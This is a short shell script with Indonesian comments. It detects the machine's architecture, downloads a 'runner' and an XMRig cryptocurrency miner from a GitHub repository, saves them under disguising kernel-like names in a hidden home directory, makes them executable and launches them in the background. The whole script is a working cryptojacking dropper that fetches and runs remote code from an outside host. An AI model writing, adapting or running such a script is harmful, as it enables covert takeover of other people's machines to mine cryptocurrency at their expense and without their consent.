#!/bin/sh
set -e

REPO_URL="https://github.com/anonking-67/anon76/raw/refs/heads/main"

# Deteksi Arsitektur
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        RUNNER="kernel86"
        MINER="kernelU"
        ;;
    aarch64|arm64)
        RUNNER="kernel64"
        MINER="kernelX"
        ;;
    *)
        echo "[-] Arsitektur $ARCH tidak didukung."
        exit 1
        ;;
esac

WORKDIR="$HOME/.kernel-worker"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Download Runner (Program Go)
echo "[+] Mendownload runner $RUNNER untuk $ARCH..."
curl -fsSL -o "$RUNNER" "${REPO_URL}/${RUNNER}" || { echo "[-] Gagal download runner"; exit 1; }

# Download Miner (XMRig)
echo "[+] Mendownload miner $MINER untuk $ARCH..."
curl -fsSL -o "$MINER" "${REPO_URL}/${MINER}" || { echo "[-] Gagal download miner"; exit 1; }

# Izin Eksekusi
chmod +x "$RUNNER" "$MINER"

echo "[+] Menjalankan Runner..."
./"$RUNNER"

echo "[+] Selesai. Proses berjalan di background."